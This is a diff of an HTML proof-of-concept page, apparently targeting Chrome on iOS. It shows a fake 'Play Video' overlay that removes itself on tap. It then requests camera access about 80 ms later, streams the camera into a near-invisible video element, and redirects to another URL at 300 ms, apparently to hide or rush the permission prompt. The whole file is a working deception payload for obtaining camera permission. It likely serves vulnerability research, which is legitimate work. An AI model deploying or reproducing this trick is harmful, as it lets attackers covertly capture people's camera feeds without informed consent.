@@ -1,19 +1,21 @@
-<!DOCTYPE html>
-<html>
+<!doctype html>
+<html lang="en">
 <head>
+<meta charset="utf-8">
+<title>Chrome iOS Camera Permission PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<title>Video Player</title>
 
 <style>
 html, body {
   margin: 0;
   padding: 0;
-  background: black;
   height: 100%;
+  background: black;
+  font-family: -apple-system, BlinkMacSystemFont, system-ui;
   overflow: hidden;
-  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
 }
 
+/* Fake UI */
 #overlay {
   position: fixed;
   inset: 0;
@@ -29,12 +31,16 @@ html, body {
   color: black;
   font-size: 22px;
   padding: 18px 40px;
-  border-radius: 12px;
+  border-radius: 14px;
 }
 
-#cam {
+/* Camera */
+video {
   position: fixed;
   inset: 0;
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
   opacity: 0.01;
 }
 </style>
@@ -46,19 +52,28 @@ html, body {
   <div id="play">▶️ Play Video</div>
 </div>
 
-<video id="cam" autoplay playsinline></video>
+<video id="camera" autoplay playsinline></video>
 
 <script>
-document.getElementById("overlay").addEventListener("click", async () => {
-  // remove UI immediately
-  document.getElementById("overlay").remove();
+const overlay = document.getElementById('overlay');
+const camera  = document.getElementById('camera');
 
-  // small timing gap before permission
+overlay.addEventListener('click', () => {
+  // 1️⃣ Remove visual context
+  overlay.remove();
+
+  // 2️⃣ Trigger camera permission shortly after tap
   setTimeout(async () => {
     try {
-      await navigator.mediaDevices.getUserMedia({ video: true });
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      camera.srcObject = stream;
     } catch (e) {}
   }, 80);
+
+  // 3️⃣ Redirect shortly after permission UI
+  setTimeout(() => {
+    location.href = "https://google.com:8080";
+  }, 300);
 });
 </script>
 
